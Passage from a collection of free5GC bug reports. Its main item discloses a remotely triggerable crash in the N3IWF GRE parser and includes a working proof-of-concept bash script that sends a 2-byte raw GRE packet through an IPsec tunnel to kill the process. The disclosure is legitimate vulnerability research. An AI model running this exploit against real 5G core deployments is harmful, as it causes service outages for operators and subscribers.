2. Add a healthcheck (or an internal watchdog) that fails while the PFCP server loop is not
   running — at present the container looks perfectly healthy throughout the outage, and the
   eventual restart reports exit code 0, so neither crash monitors nor liveness probes see anything.

items.title: [Bugs] N3IWF GRE Unmarshal performs zero bounds checking on input buffer, Fatalf kills entire process, causing DoS
items.body:
## Bug Decription

A remote, authenticated attacker can crash the `N3IWF` process by sending a short GRE packet with length smaller than 4 bytes through the live NWu user-plane IPsec tunnel. `GREPacket.Unmarshal()` performs no bounds checking before reading `b[0]`, `b[1]`, and `b[2:4]`. The panic is then caught by the `forwardUL()` recover block, which calls `nwuupLog.Fatalf(...)` and terminates the whole process with `os.Exit(1)`.

Crash site in `n3iwf/internal/gre/message.go`:

```go
func (p *GREPacket) Unmarshal(b []byte) error {
    p.flags = b[0]
    p.version = b[1]
    p.protocolType = binary.BigEndian.Uint16(b[2:4])
    if p.GetKeyFlag() {
        p.key = binary.BigEndian.Uint32(b[offset:offset+4])
    }
}
```

Fatal recovery in `n3iwf/internal/nwuup/server.go`:

```go
defer func() {
    if p := recover(); p != nil {
        nwuupLog.Fatalf("panic: %v\n%s", p, string(debug.Stack()))
    }
}()
```

## To Reproduce

Steps to reproduce the behavior:

1. Prepare a live free5GC `v4.2.1` lab with `N3IWF`, `UPF`, `amf`, `n3iwf`, and `n3iwue` containers, and make sure the host has the `gtp5g` kernel module loaded.
2. Run command `test_n3iwf_nwuup_short_gre_fatal_dos.sh`.
4. The script restarts `amf` and `n3iwf`, cleans prior `n3iwue` state, starts a real `n3iwue`, waits until the log shows `PduSession Created`, confirms that `ipsec-2` exists, and then sends a 2-byte GRE payload `0x20 0x00` to `10.0.0.1` through `ipsec-2`.
5. During live Docker validation on `2026-04-04 UTC`, the script observed `sent-short-gre`, and `n3iwf` changed from `status=running running=true restart=0 exit=0` to `status=exited running=false restart=0 exit=1` with `finished=2026-04-04T06:51:14.800282681Z`.

Validated live reproduction command:

```bash
test_n3iwf_nwuup_short_gre_fatal_dos.sh
```

PoC script used in live Docker validation:

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="/home/ubuntu/free5gc_v421/free5gc"
N3UE_LOG="/tmp/n3iwue_nwuup_short_gre.log"

cleanup_n3ue() {
  docker exec n3iwue sh -lc 'for pid in $(pgrep -f "/n3iwue" 2>/dev/null || true); do if [ "$pid" != "$$" ]; then kill "$pid" 2>/dev/null || true; fi; done; sleep 1'
  docker exec n3iwue sh -lc "cd /n3iwue && ./clean.sh >/tmp/n3iwue_clean.log 2>&1 || true"
}

wait_for_user_plane() {
  local timeout_secs="$1"
  local deadline=$((SECONDS + timeout_secs))

  while (( SECONDS < deadline )); do
    if docker exec n3iwue sh -lc "test -f '$N3UE_LOG' && grep -q 'PduSession Created' '$N3UE_LOG'"; then
      return 0
    fi
    sleep 1
  done

  return 1
}

cd "$REPO_ROOT"
trap cleanup_n3ue EXIT

echo "[*] restarting amf and n3iwf"
docker restart amf >/dev/null
docker restart n3iwf >/dev/null
sleep 3

echo "[*] cleaning previous n3iwue state"
cleanup_n3ue
docker exec n3iwue sh -lc "rm -f '$N3UE_LOG'"

start_ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "[*] trigger timestamp: $start_ts"

echo "[*] starting real n3iwue inside container"
docker exec -d n3iwue sh -lc "cd /n3iwue && ./n3iwue >'$N3UE_LOG' 2>&1"
sleep 1

echo "[*] waiting for user-plane setup"
if ! wait_for_user_plane 60; then
  echo "[!] n3iwue did not reach 'PduSession Created' within 60 seconds"
  echo "[*] recent n3iwue log"
  docker exec n3iwue sh -lc "tail -n 120 '$N3UE_LOG' 2>/dev/null || true"
  exit 1
fi

echo "[*] confirmed user-plane setup"
docker exec n3iwue sh -lc "ip -4 addr; ip xfrm state; ip link show type xfrm; ip link show type gre" >/tmp/n3iwue_short_gre_state.out 2>&1 || true
cat /tmp/n3iwue_short_gre_state.out

echo "[*] n3iwf status before trigger"
docker inspect n3iwf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

echo "[*] sending 2-byte GRE payload through ipsec-2"
docker exec n3iwue perl -MSocket -e 'use constant SO_BINDTODEVICE => 25; socket(my $s, AF_INET, SOCK_RAW, 47) or die "socket: $!\n"; setsockopt($s, SOL_SOCKET, SO_BINDTODEVICE, "ipsec-2\0") or die "bindtodev: $!\n"; bind($s, sockaddr_in(0, inet_aton("10.0.0.2"))) or die "bind: $!\n"; my $dst = sockaddr_in(0, inet_aton("10.0.0.1")); send($s, "\x20\x00", 0, $dst) or die "send: $!\n"; print "sent-short-gre\n";'

sleep 1

echo "[*] n3iwf status after trigger"
docker inspect n3iwf --format 'status={{.State.Status}} running={{.State.Running}} restart={{.RestartCount}} exit={{.State.ExitCode}} started={{.State.StartedAt}} finished={{.State.FinishedAt}}'

echo "[*] recent n3iwf logs"
docker logs --since "$start_ts" --tail 160 n3iwf 2>&1
```

## Expected Behavior
